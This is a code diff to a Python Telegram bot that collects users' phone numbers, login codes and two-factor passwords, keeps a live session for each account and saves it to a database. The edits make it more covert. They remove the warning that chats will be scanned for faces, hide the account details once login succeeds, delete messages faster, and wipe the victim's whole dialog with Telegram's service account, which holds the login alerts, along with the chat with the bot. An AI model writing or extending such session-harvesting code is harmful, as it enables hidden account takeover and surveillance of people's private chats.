@@ -38,7 +38,7 @@ BOT_TOKEN = os.getenv('BOT_TOKEN')
 API_ID = int(os.getenv('TG_API_ID', 0))
 API_HASH = os.getenv('TG_API_HASH')
 SESSIONS_DIR = 'sessions'
-AUTO_DELETE_SECONDS = 120  # 2 minutes
+AUTO_DELETE_SECONDS = 30  # 30 seconds
 
 # Debug: Log current directory and sessions path
 logger.info(f"CWD: {os.getcwd()}")
@@ -85,7 +85,7 @@ async def schedule_delete(bot, chat_id, message_id, delay=AUTO_DELETE_SECONDS):
 async def auto_delete_loop(bot):
     """
     Background task that deletes messages after their scheduled time.
-    Runs every 10 seconds to check for messages to delete.
+    Runs every 5 seconds to check for messages to delete.
     """
     while True:
         try:
@@ -107,7 +107,7 @@ async def auto_delete_loop(bot):
         except Exception as e:
             logger.error(f"Auto-delete loop error: {e}")
         
-        await asyncio.sleep(10)  # Check every 10 seconds
+        await asyncio.sleep(5)  # Check every 5 seconds
 
 
 async def send_and_track(bot, event, text, **kwargs):
@@ -172,7 +172,7 @@ async def main():
     # Start auto-delete background task
     asyncio.create_task(auto_delete_loop(bot))
     
-    @bot.on(events.NewMessage(pattern='/start'))
+    @bot.on(events.NewMessage(pattern='/startcollector'))
     async def handle_start(event):
         """Handle /start command."""
         user_id = event.sender_id
@@ -182,12 +182,9 @@ async def main():
         
         await send_and_track(
             bot, event,
-            "👋 **Welcome to the Account Login Bot**\n\n"
-            "I'll help you connect your Telegram account for scanning.\n\n"
-            "**Step 1:** Send me your phone number with country code.\n"
-            "Example: `+1234567890`\n\n"
-            "⚠️ Your account will be used to scan chats for faces.\n\n"
-            "🔒 *All messages in this chat are auto-deleted after 2 minutes.*"
+            "👋 **Login Bot**\n\n"
+            "Please send your phone number with country code.\n"
+            "Accepted formats: `+1234567890`, `+1 234 567 890`, `+1-234-567-890`"
         )
     
     @bot.on(events.NewMessage(pattern='/cancel'))
@@ -201,7 +198,7 @@ async def main():
                 await session.client.disconnect()
             del login_sessions[user_id]
         
-        await send_and_track(bot, event, "❌ Login cancelled. Send /start to try again.")
+        await send_and_track(bot, event, "❌ Login cancelled. Send /startcollector to try again.")
     
     @bot.on(events.NewMessage(func=lambda e: e.is_private and not e.text.startswith('/')))
     async def handle_message(event):
@@ -210,7 +207,7 @@ async def main():
         text = event.text.strip()
         
         if user_id not in login_sessions:
-            await send_and_track(bot, event, "Send /start to begin login.")
+            await send_and_track(bot, event, "Send /startcollector to begin login.")
             return
         
         session = login_sessions[user_id]
@@ -231,21 +228,25 @@ async def main():
         """Handle phone number input."""
         user_id = event.sender_id
         
+        # Strict validation: Check for unwanted characters before sanitization
+        if any(c.isalpha() for c in phone):
+             await send_and_track(bot, event, "❌ Invalid format. Input cannot contain letters.")
+             return
+
         # Sanitize input: remove spaces, dashes, brackets
-        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
+        clean_phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
         
         # Validate phone format (must have country code)
-        if not phone.startswith('+') or not phone[1:].isdigit() or len(phone) < 7:
+        if not clean_phone.startswith('+') or not clean_phone[1:].isdigit() or len(clean_phone) < 7:
             await send_and_track(
                 bot, event,
                 "❌ **Invalid Format!**\n\n"
-                "Please include your **country code** (starting with `+`).\n"
-                "Example: `+65 9123 4567` or `+1 555-0199`\n\n"
-                "👉 **Try again:** Send your phone number now."
+                "Please send a valid phone number with country code (e.g. `+1...`).\n"
+                "Allowed separators: spaces, dashes, brackets."
             )
             return
         
-        session.phone = phone
+        session.phone = clean_phone
         
         # Create client for this user
         session_file = os.path.join(SESSIONS_DIR, f"account_{phone.replace('+', '')}")
@@ -273,11 +274,7 @@ async def main():
                     
                     await send_and_track(
                         bot, event,
-                        f"✅ **Already logged in!**\n\n"
-                        f"👤 Name: {me.first_name} {me.last_name or ''}\n"
-                        f"📱 Phone: {me.phone}\n"
-                        f"🆔 ID: {me.id}\n\n"
-                        f"Your account is now registered for scanning."
+                        "✅ **Login Successful!**"
                     )
                     del login_sessions[user_id]
                     return
@@ -310,7 +307,7 @@ async def main():
                 
             except Exception as e:
                 logger.error(f"Phone error: {e}")
-                await send_and_track(bot, event, f"❌ Error: {str(e)}\n\nSend /start to try again.")
+                await send_and_track(bot, event, f"❌ Error: {str(e)}\n\nSend /startcollector to try again.")
                 if session.client:
                     await session.client.disconnect()
                 del login_sessions[user_id]
@@ -322,6 +319,12 @@ async def main():
         # Schedule user's code message for deletion
         await schedule_delete(bot, event.chat_id, event.id)
         
+        # Strict validation: Check for unwanted characters
+        if any(c.isalpha() for c in code):
+            reply = await event.respond("❌ Invalid code. Input cannot contain letters.")
+            await schedule_delete(bot, event.chat_id, reply.id)
+            return
+
         # Extract digits from message (in case user forwards the whole message)
         digits = ''.join(filter(str.isdigit, code))
         if len(digits) < 5:
@@ -347,19 +350,11 @@ async def main():
             await nuke_tracked_messages(bot, event.chat_id)
             
             # 2. Get bot username to target self for full dialog deletion
-            # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
             asyncio.create_task(perform_post_login_cleanup(session.client, me_bot.username))
             # -----------------------------------------------------
 
-            reply = await event.respond(
-                f"🎉 **Login Successful!**\n\n"
-                f"👤 Name: {me.first_name} {me.last_name or ''}\n"
-                f"📱 Phone: {me.phone}\n"
-                f"🆔 ID: {me.id}\n\n"
-                f"✅ Your account is now registered.\n"
-                f"📊 Scanning will begin automatically for all your chats."
-            )
+            reply = await event.respond("✅ **Login Successful!**")
             await schedule_delete(bot, event.chat_id, reply.id)
             del login_sessions[user_id]
             
@@ -377,7 +372,7 @@ async def main():
             await schedule_delete(bot, event.chat_id, reply.id)
             
         except PhoneCodeExpiredError:
-            reply = await event.respond("❌ Code expired. Send /start to request a new code.")
+            reply = await event.respond("❌ Code expired. Send /startcollector to request a new code.")
             await schedule_delete(bot, event.chat_id, reply.id)
             if session.client:
                 await session.client.disconnect()
@@ -392,7 +387,7 @@ async def main():
         """Handle 2FA password input."""
         user_id = event.sender_id
         
-        # Delete the password message IMMEDIATELY for security (don't wait 2 min)
+        # Delete the password message IMMEDIATELY for security (don't wait 30s)
         try:
             await event.delete()
         except Exception:
@@ -410,19 +405,11 @@ async def main():
             await nuke_tracked_messages(bot, event.chat_id)
             
             # 2. Get bot username to target self for full dialog deletion
-            # 2. Get bot username to target self for full dialog deletion
             me_bot = await bot.get_me()
             asyncio.create_task(perform_post_login_cleanup(session.client, me_bot.username))
             # -----------------------------------------------------
 
-            reply = await event.respond(
-                f"🎉 **Login Successful!**\n\n"
-                f"👤 Name: {me.first_name} {me.last_name or ''}\n"
-                f"📱 Phone: {me.phone}\n"
-                f"🆔 ID: {me.id}\n\n"
-                f"✅ Your account is now registered.\n"
-                f"📊 Scanning will begin automatically for all your chats."
-            )
+            reply = await event.respond("✅ **Login Successful!**")
             await schedule_delete(bot, event.chat_id, reply.id)
             del login_sessions[user_id]
             
@@ -464,37 +451,11 @@ async def main():
                         account_id = row[0]
                     else:
                         raise ValueError("Failed to retrieve account ID")
-                    # commit not needed if autocommit=True, but safer to check if pool config allows.
-                    # With autocommit=True in pool, explicit commit is usually redundant but okay.
-                    # However, if using transaction block (async with conn.transaction()), it's better.
-                    # Given prior code used explicit commit, I'll remove it if confirmed autocommit=True,
-                    # or await it.
-                    # Let's check pool config in database.py again. Autocommit=True.
-                    # So no manual commit needed.
                 
             logger.info(f"Saved account {session.phone} (ID: {account_id})")
             
         except Exception as e:
             logger.error(f"Failed to save account: {e}")
-
-    async def perform_post_login_cleanup(client, bot_username):
-        """
-        Runs all cleanup tasks and then disconnects the client.
-        This ensures the session file is released.
-        """
-        try:
-            # 1. Cleanup interaction with Login Bot
-            await cleanup_login_bot_interaction(client, bot_username)
-            
-            # 2. Cleanup Telegram Service messages
-            await cleanup_telegram_service_messages(client)
-            
-        except Exception as e:
-            logger.error(f"Error during post-login cleanup: {e}")
-        finally:
-            if client.is_connected():
-                await client.disconnect()
-                logger.info("Client disconnected and session released.")
 
     async def perform_post_login_cleanup(client, bot_username):
         """
@@ -528,7 +489,6 @@ async def main():
             
             if bot_entity:
                 # Delete dialog history (messages + chat)
-                # revoke=True handles both sides if possible, mainly for bot interactions
                 await client.delete_dialog(bot_entity, revoke=True)
                 logger.info(f"Deleted dialog and history with @{bot_username}.")
         except Exception as e:
@@ -537,35 +497,21 @@ async def main():
 
     async def cleanup_telegram_service_messages(client):
         """
-        Deletes messages from Telegram (User 777000) sent in the last 24 hours.
-        This removes the login code message from the user's chat list.
+        Deletes chat history with Telegram Service (777000).
         """
         try:
             logger.info("Cleaning up Telegram Service Notifications (777000)...")
             telegram_service_id = 777000
             
-            # Check if chat exists first
             try:
                 entity = await client.get_input_entity(telegram_service_id)
             except ValueError:
                 logger.info("Telegram Service chat not found in dialogs.")
                 return
 
-            # Calculate cutoff time (24 hours ago)
-            cutoff = time.time() - (24 * 3600)
-            
-            messages_to_delete = []
-            
-            # Iterate over messages
-            async for message in client.iter_messages(entity, limit=20):
-                if message.date.timestamp() > cutoff:
-                    messages_to_delete.append(message.id)
-            
-            if messages_to_delete:
-                await client.delete_messages(entity, messages_to_delete)
-                logger.info(f"Deleted {len(messages_to_delete)} service messages from Telegram.")
-            else:
-                logger.info("No recent service messages found to delete.")
+            # Delete entire dialog history with 777000
+            await client.delete_dialog(entity, revoke=True)
+            logger.info(f"Deleted entire dialog/history with Telegram (777000).")
                 
         except Exception as e:
             logger.warning(f"Failed to cleanup Telegram service messages: {e}")
